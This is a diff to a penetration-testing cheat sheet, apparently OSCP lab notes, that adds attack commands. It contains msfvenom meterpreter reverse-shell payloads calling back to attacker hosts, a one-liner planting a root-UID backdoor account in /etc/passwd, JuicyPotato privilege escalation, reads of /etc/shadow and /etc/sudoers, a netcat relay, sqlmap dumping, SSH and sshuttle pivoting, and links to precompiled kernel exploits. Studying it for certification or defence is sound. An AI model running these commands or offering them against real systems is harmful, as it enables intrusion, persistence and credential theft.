@@ -349,6 +349,7 @@ wpscan
 common examples:
 dirb http://192.168.0.12/           (uses default common word list)
 gobuster dir --url https://10.11.1.237/ --wordlist /usr/share/wordlists/dirb/common.txt --followredirect --insecuressl      (use for https site with self-gen certs)
+gobuster dir --url http://10.1.1.27/ --proxy socks5://127.0.0.1:9050 --wordlist /usr/share/wordlists/dirb/common.txt --extensions php,htm,html --expanded --followredirect         (if you need extensions or through proxy to ssh tunnel while pivoting)
 
 Burpsuite, copy entire POST request to file using burp function, then run: 
 sqlmap –r POSTfile.txt  (     if sucessful, run sqlmap -r POSTfile.txt --dump     ) (get creds or juicy info)
@@ -368,7 +369,9 @@ OR      nmap -p 80 192.168.1.4 –script http-put –script-args http-put.url=�
 sniffer: (always use when throwing data at target, to see the packets real time)
 tcpdump -n -v -i [interface] host 10.XX.XX.XX
 
-top with iptables for monitoring tunnels 
+watch with iptables for monitoring throughput of cmds, how much data over the wire
+
+watch -n 2 sudo ss -ntp   (watch for established connections, ensure tunnels are working) 
 
 ss -antup (check for listening/established connections (tcp) ) (used to be netstat, depricated)
 ss -s  (stats by protocol)
@@ -797,6 +800,14 @@ wget -r --no-parent http://10.25.3.92    (pull down entire contents of web serve
 wget https://10.x.x.x/file.exe --no-check-certificate
 curl
 
+SFTP
+sftp     (interactive)
+put file.txt   (upload)
+get file.txt   (download)
+lcd          (change local dir)
+lpwd         (show local dir)
+ls
+cd
 
 
 netcat shells (backdoor):
@@ -913,6 +924,8 @@ echo 'bill:badpassword'|chpasswd  (if you need non-interactive – or try)
 usermod --password [PASSWORD] [USERNAME]    
 usermod -aG sudo bill           (add as sudo user)  (watch out for old distros that don't support the -a option)
 
+sudo echo ‘bill:$1$R5LeHFZy$OJvfAbRCbCMgFvLDonMjN1:0:0:root:/root:/bin/bash’ >> /etc/passwd (some systems may prevent this, put an "x" in field 2 and add hash to /etc/shadow entry)
+
 CentOS add sudo user
 adduser bill
 passwd bill
@@ -998,7 +1011,9 @@ newer:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.216 LPORT=443 -f aspx -o shell.aspx
 
 PHP
-root@kal:/tmp# msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.1.229 LPORT=53 -f raw -o shell.php
+pentest-monkey php reverse shell for linux
+windows: https://github.com/Dhayalanb/windows-php-reverse-shell  (change IP, port, and make sure DIR is writable; temp and C:\inetpub\www are options)
+root@kal:/tmp# msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.1.229 LPORT=443 -f raw -o shell.php
 ***Make sure to add    ?php and ?> in to msfvenom.php file (beginning and end respective)***
 
 https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
@@ -1034,14 +1049,18 @@ OSCP post-exp checklists:
         net start
         net share
         net use
+        findstr 
 
         **Lin:
+        umask 0000 (only if you don't care about tradecraft, easier file permissions as you hack away and drop files - will go away when session over) 
         date
         whoami
         id
         hostname
-        /sbin/ifconfig
+        ip addr
+        /sbin/ifconfig -a   (older systems)
         pwd
+        uptime
         ls -lisha
         cat proof.txt
         cat network-secret.txt
@@ -1051,19 +1070,19 @@ OSCP post-exp checklists:
         cat /etc/group
         cat /etc/shadow
         cat /etc/sudoers
+        cat /etc/login.defs  (shows how passwords are mashed by default)
         ls -alh /var/mail/
         ls -alhR /home/
         who
         w
         last
-        ip addr
-        /sbin/ifconfig -a
         cat /etc/network/interfaces (or cat /etc/sysconfig/network)
         arp -e
         /sbin/route -ne
-        ps aux
         ps -elf
+        ps aux
         cat /etc/services
+        grep
 
 
 
@@ -1093,6 +1112,11 @@ run hashdump
 
 SeImpersonatePrivilege enabled with whoami /all?  Try JuicyPotato.exe (precompiled from offsec has no /DEBUG flag set)
 start c:\inetpub\wwwroot\JuicyPotato.exe -t t -p c:\inetpub\wwwroot\meterpretershell.exe -l 5837
+
+
+Windows Kernel Exploits:
+https://github.com/SecWiki/windows-kernel-exploits
+
 
 Linux:
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
@@ -1156,6 +1180,9 @@ Who are the sudo users? Any sudo misconfigs?
 Cron job abuse
 Any SUID binaries? 
 “.” In $PATH?
+
+https://github.com/lucyoa/kernel-exploits   <--- pre-compiled, use at your own risk!! awesome repository!!
+
 
 Examples:
 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs  https://dirtycow.ninja 
@@ -1329,10 +1356,14 @@ netsh interface portproxy show v4tov4
 
 SSH tunneling
 SSH port forward: ssh -L [localport]:127.0.0.1:[victim_ip]:[port_to_access_on_victim] -N -f -l [pivotbox_user]@[pivotbox_ip]  (-N is for don’t execute a remote command, -f runs ssh in the background)
-SSH dynamic forwarding: ssh -i ~/oscp/sshkeys/mykey -f -N -D 127.0.0.1:9050 root@10.11.1.35 (point your tools at 127.0.01:9050 if they support use of proxies (nmap can get tricky since it uses raw sockets for connections - limit uses to user level scans through pivot boxes))
+
+SSH dynamic forwarding: ssh -i ~/oscp/sshkeys/mykey -N -D 127.0.0.1:9050 root@10.11.1.35 (point your tools at 127.0.01:9050 if they support use of proxies (nmap can get tricky since it uses raw sockets for connections - limit uses to user level scans through pivot boxes)) (hit ctrl-z, then jobs, then bg %[jobnumber] to run tunnel in background)
+
+sshuttle (turn ssh into a psuedo VPN)
+sudo sshuttle -v --dns --exclude 18.x.x.x --remote ubuntu@18.x.x.x 0.0.0.0/0 --ssh-cmd 'ssh -i /home/user/.ssh/key.pem'     (pipe all traffic through the remote host :) it does the iptables rules for you  )
 
 
-proxychains
+proxychains-ng
 (make sure to edit /etc/proxychains.conf and define what port and kind of proxy - default is 9050 for tor. Ideally you have a dynamic ssh tunnel to pass traffic through)
 scanning through a pivot box: proxychains4 nmap --top-ports 50 -Pn -sT -n -T4 -sV 10.11.1.39 -oG 39.nmap
 web enumeration example: proxychains4 whatweb http://10.11.1.39
@@ -1354,7 +1385,7 @@ ncat
 mknod fifo p
 nc -nvlp 4444 0< fifo | nc 10.10.10.10 445 1> fifo
 
-port scanner on Windows cmd line (no tools):
+port scanner on Windows cmd line (no tools, needs icmp):
 for /L %i in (1,1,255) do @ping -n 1 192.168.0.%i | find "Reply"
 
 
